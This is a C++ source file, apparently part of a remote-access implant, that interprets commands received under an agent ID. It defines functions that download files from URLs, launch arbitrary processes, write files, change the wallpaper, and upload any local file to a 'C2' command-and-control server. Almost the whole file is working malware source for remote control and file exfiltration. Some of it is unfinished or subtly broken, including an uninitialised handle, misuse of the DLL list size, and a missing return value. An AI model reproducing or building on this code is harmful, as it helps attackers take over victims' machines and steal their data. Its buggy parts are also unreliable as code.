#include "functions.h"

//spezzo anche contesti per codeblock?
//prendi riga per riga finchè non finisce il testo   (riga =fino al ;)
//spezza le righe in atom
//controlla le necessità(parametri) dell'atom
//per le assegnazioni devo capire la grandezza del valore assegnato e salvarmi pointer e moniker della variabile in una hashmap
// o magari un oggetto, altrimenti come salvo la grandezza di una variabile? con uno struct?
// tratterei tutte le variabili come VOID* e userei un reinterpret_cast a qualsiasi tipo di variabile in base alla grndzz

std::wstring dll_list[] ={
	L"",
	L"",
	L"",
	L"",
	L"",
	L"",
	L"",


};


struct {
	int len;
	void* mem;
} typedef variable;

struct {
	size_t return_size;
	std::vector<size_t> arg_sizes;
} typedef signature;

struct {
	bool (*pointer)(std::vector<std::wstring> args);
	signature signature;
} typedef function;

std::unordered_map<std::wstring, function> funcMap;
std::unordered_map<std::wstring, variable> varMap;

std::wstring agent_id;

namespace interpreter {

	std::wstring InterpretTask(std::wstring task, std::wstring id) {
		
		agent_id = id;


		funcMap[L"createfile"].pointer = (*createfilewrap);
		funcMap[L"downloadfile"].pointer = (*downloadfile);
		funcMap[L"uploadfile"].pointer = (*uploadfile);
		funcMap[L"createprocess"].pointer = (*createprocesswrap);
		funcMap[L"wallpaper"].pointer = (*setWallpaper);
		bool f = true;
		std::wstringstream ts(task);
		std::wstring line;
		std::wstring atom;
		std::vector<std::wstring> atoms;
		while (std::getline(ts, line, L';')) {
			//atomize line
			std::wstringstream ls(line);
			atoms.clear();
			while (ls>>atom) {
				atoms.push_back(atom);
			}
			
			//check functions

			if (funcMap.contains(atoms[0]))
				f=funcMap[atoms[0]].pointer(atoms)?f:false;

			//check variables
			if (varMap.contains(atoms[0])) {

				//parsare tipo del valore da assegnare cacatore
				
				/*if (!_wcsicmp(atoms[1].c_str(), L"="))
					memcpy_s(varMap[atoms[0]].mem*/
			}

		}


		return f?L"All is well, executed.":L"An error occurred.";
	}

	bool loadFunction(std::vector<std::wstring> args) {
		HMODULE dll_handle;
		for(int i = 0; i<dll_list->size() && !dll_handle;i++)
			dll_handle = LoadLibraryExW(dll_list[i].c_str(), nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32);
		if (!dll_handle) return false;

		FARPROC func_ptr = GetProcAddress(dll_handle, misc::WideStringToUTF8(args[1]).c_str());
		if (!func_ptr) {
			FreeLibrary(dll_handle);
			return false;
		}

		//funcMap[args[1]].pointer=func_ptr;
		return true;
	}

	bool downloadfile(std::vector<std::wstring> args) {
		URLDownloadToFileW(NULL, args[1].c_str(), args[2].c_str(), 0, NULL);
		return true;
	}

	bool createprocesswrap(std::vector<std::wstring> args) {
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		CreateProcessW(0, const_cast<wchar_t*>(args[1].c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return true;
	}
	
	bool createfilewrap(std::vector<std::wstring> args) {
		std::wofstream cfg_file(args[1]);
		for (int i = 2; i < args.size(); i++)
			cfg_file << args[i] <<L" ";
		cfg_file.close();
		return true;
	}

	bool uploadfile(std::vector<std::wstring> args) {
		std::ifstream file(args[1], std::ios::binary | std::ios::ate);
		if (!file.is_open()) return false;

		size_t file_size = static_cast<size_t>(file.tellg());
		file.seekg(0, std::ios::beg);

		std::vector<char> file_data(file_size);
		file.read(file_data.data(), file_size);

		std::wstring filename;
		size_t pos = args[1].find_last_of(L"\\/");
		if (pos != std::wstring::npos) {
			filename = args[1].substr(pos + 1);
		}
		else {
			filename = args[1];
		}
		std::string boundary = "----Boundary" + std::to_string(GetTickCount());
		std::ostringstream body;

		body << "--" << boundary << "\r\n"
			<< "Content-Disposition: form-data; name=\"file\"; filename=\""
			<< misc::WideStringToUTF8(filename) << "\"\r\n"
			<< "Content-Type: application/octet-stream\r\n\r\n";

		body.write(file_data.data(), file_data.size());
		body << "\r\n--" << boundary << "--\r\n";

		std::string body_str = body.str();
		std::wstring content_type = L"multipart/form-data; boundary=" +
			misc::UTF8ToWideString(boundary);

		std::wstring path = L"/" + agent_id + L"/upload";
		std::wstring response = network::MakeHttpRequest(
			C2, path, body_str, L"POST", content_type
		);

		return !response.empty();

	}
	bool setWallpaper(std::vector<std::wstring> args) {
		wchar_t PathToFile[MAX_PATH];
		HMODULE GetModH = GetModuleHandle(NULL);
		GetModuleFileNameW(GetModH, PathToFile, sizeof(PathToFile));
		std::wstring::size_type pos = std::wstring(PathToFile).find_last_of(L"\\/");
		std::wstring dir = std::wstring(PathToFile).substr(0, pos);
		dir += L"\\"+args[1];
		SystemParametersInfoW(SPI_SETDESKWALLPAPER, 1, (void*)dir.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
	}

	
}


